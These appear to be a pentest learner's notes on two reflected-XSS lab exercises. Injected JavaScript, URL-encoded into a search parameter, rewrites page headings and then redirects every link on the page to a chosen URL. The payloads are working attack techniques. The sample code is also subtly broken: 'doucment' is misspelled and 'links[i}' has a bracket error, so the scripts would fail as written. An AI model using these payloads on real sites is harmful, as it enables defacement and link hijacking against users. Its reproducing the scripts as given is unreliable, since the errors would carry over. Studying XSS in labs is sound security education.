                    Javascript For Pentesters

1 - Modify Html
The task is to modify a couple of page elements.
Source code of page is examined so that items to be modified can be identified in their elements eg H1, div etc
In the example the innerHtml of a h2 tag will need to be modified as well as a h1 tag
The JS script that is used to change the tags which contain the items to be changed is
Script Syntax
  <script>
    // Gets the third h2 tag
    document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
    // get the first h1 tag
    doucment.getElementsByTagName("h1")[0].innerHTML = "Found You";
  </script>
On the sample page anything entered into the searchbox will be reflected back to the page 
  - This field can be used for xss injection
The script is ran through a url encoder
  - https://meyerweb.com/eric/tools/dencoder/
The script is added to the url parameter in the address bar in the browser


2 - Change All Links
The task on this occasion is to change on links on a page to point to a given url
Similar to the previous task the page reflects back what is typed in the box making it vulnerable to a XSS attack
Script Syntax
<script>
  // Gives all the a href links
  var links = document.getElementsByTagName("a");
  
  // Iterates through the links but there are many different ways of doing this
  for(i = 0; i < links.length; i++){
    // Change the url at each link in the array
    links[i].href = "url";
    links[i}.innerHTML = "Link Modified";
  }
</script>
Again run the script through the urlencoder and add as a paremeter to url in the address bar
